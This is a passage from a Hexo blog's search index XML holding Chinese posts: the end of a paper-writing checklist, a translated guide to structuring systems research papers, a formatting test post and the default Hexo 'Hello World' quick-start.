是否定义？</li><li>前向引用是否保持在最低限度？（避免出现大量 “稍后将详细描述XXX（一个陌生术语）……”）</li><li>是否考虑了替代组织？（对这一点不太理解）</li><li>是先写的摘要吗？它传达了论文的重要思想吗？</li><li>论文写完了吗？</li></ul><hr><ul><li>文字是否清晰简洁？</li><li>单词的拼写和使用是否正确？</li><li>句子是否完整且语法正确？</li><li>是否避免歧义、俚语和口语化？</li></ul><hr><p>原文链接：<a href="https://www.usenix.org/legacy/events/samples/submit/advice.html">https://www.usenix.org/legacy/events/samples/submit/advice.html</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文献综述——The structure of paperreport in Systems</title>
    <link href="/2023/09/14/%E6%96%87%E7%8C%AE%E7%BB%BC%E8%BF%B0%E2%80%94%E2%80%94The-structure-of-paperreport-in-Systems/"/>
    <url>/2023/09/14/%E6%96%87%E7%8C%AE%E7%BB%BC%E8%BF%B0%E2%80%94%E2%80%94The-structure-of-paperreport-in-Systems/</url>
    
    <content type="html"><![CDATA[<h1 id="The-structure-of-paperreport-in-Systems"><a href="#The-structure-of-paperreport-in-Systems" class="headerlink" title="The structure of paperreport in Systems"></a>The structure of paperreport in Systems</h1><p>some rules：</p><ul><li>1.在每个部分中，第一段应该是本节的摘要&#x2F;概述。可以先说：“在本节中，我们将介绍……”</li><li>2.在每个段落中，第一行（或第二行）应该对应于段落的摘要。</li><li>3.自上而下：从高层次开始，从高层次开始慢慢增加细节。</li><li>4.总长度：~15 页。</li></ul><p><strong>摘要</strong>[1段200-300字]</p><p>1-2行：本文的目标<br>1-2行：工作的动机和重要性<br>1-2行：结合我们工作的结果或贡献 <em>[尽量引用直观或易于解释的指标的数字来量化你的主张]</em></p><p><strong>引言</strong> [1-1.5页]</p><ul><li>(1段)问题是什么，动机，重要性，主要贡献</li><li>(1段)问题：高层次的定义，意义</li><li>(1段)以前的工作[每篇相关论文最多一行，为下一节留下详细信息]</li><li>(1段)我们的贡献：可能的结果和贡献</li><li>“本文的其余部分结构如下。在第 2 节中,…..”</li></ul><p><strong>背景和模型</strong> [1-1.5 页]</p><ul><li>(1段)定义、场景、模型</li><li>(1段)以前的工作 [仅当这有助于显示出自己的工作是不同的或更好的时才提供详细信息。]</li><li>(1段)以前工作的弱点或你提出的东西的缺点</li><li>(1段)工作的假设和局限性。[诚实，但不要谴责你的工作]。</li></ul><p><strong>我们的想法</strong> [根据需要]</p><ul><li>(1段)创新点概述</li><li>(多段)它是什么以及它是如何工作的</li><li>(多段) 解释细节</li></ul><p><strong>分析</strong> [根据需要]</p><ul><li>(1段)在本节中证明的内容概述</li><li>(1段)特定于分析的定义 [将在证明中使用的图形结构]</li><li>(多段)分析 - 证明</li><li>(1段)注释 - 直观或实用层面的证明的含义</li></ul><p><strong>实验结果</strong> [根据需要]</p><ul><li>(1段)实验概述：我们做什么，我们不做什么，为什么</li><li>(1段)模拟模型或测量基础设施</li><li>(多段)实验结果<ul><li>使用标题（粗体）区分实验</li><li>每个图都应该有一个明确的出现原因</li><li>解释每个图： 轴，我们看到的，趋势是什么，为什么这是趋势</li><li>统计注释将加强您的结果：置信区间，相关系数等。</li><li>每个数字应该是独立且不言自明：标题应该是可读的，并且可理解的。</li><li>评论，讨论，解释</li></ul></li></ul><p><strong>讨论</strong> [1-2 页]<br><br>可以通过以下方式加强工作的重要性：<br>  <em>a）重要性 b）与其他作品的关系 c）可能的实际应用</em></p><br><p><strong>结论</strong> [1-1.5]<br><br>[结论非常重要。不要指望读者记得你告诉他&#x2F;她的一切。]</p><ul><li>(1段)概述这项工作的内容。</li><li>(1段)主要成果和贡献</li><li>(1段)对重要性的评论或实际使用的技巧 [您的结果或经验如何在实践中帮助某人或另一位研究人员使用您的模拟器或避免陷阱]</li><li>(1段)未来工作。强调工作的重要性，但避免发表你的想法]。</li></ul><p><strong>参考文献</strong><br><br>[必须正确、完整、准确]<br></p><p><strong>附录</strong>[根据需要]<br><br>附录可以写任何想写的东西：审稿人没有义务通读它们。建议用途：</p><pre><code class="hljs">a）提供额外的结果，以加强您的论点，但不重要b）通过在此处放置冗长的证明或讨论细节来保持论文的流畅性c）解决一个表明你已经深入思考过这个问题的问题</code></pre><p>原文链接：<a href="http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html">http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html</a> —— <em>Michalis Faloutsos U.C. Riverside</em></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>first article</title>
    <link href="/2023/09/13/first-article/"/>
    <url>/2023/09/13/first-article/</url>
    
    <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>图片测试：</p><p><img src="http://mculover666.cn/blog/20191031/R4mWMXsrRKxu.png?imageslim"></p><p>引用测试：</p><blockquote><p>这是一条引用</p></blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p><ul><li>哈哈</li><li>嘿嘿</li><li>吼吼</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/09/13/hello-world/"/>
    <url>/2023/09/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
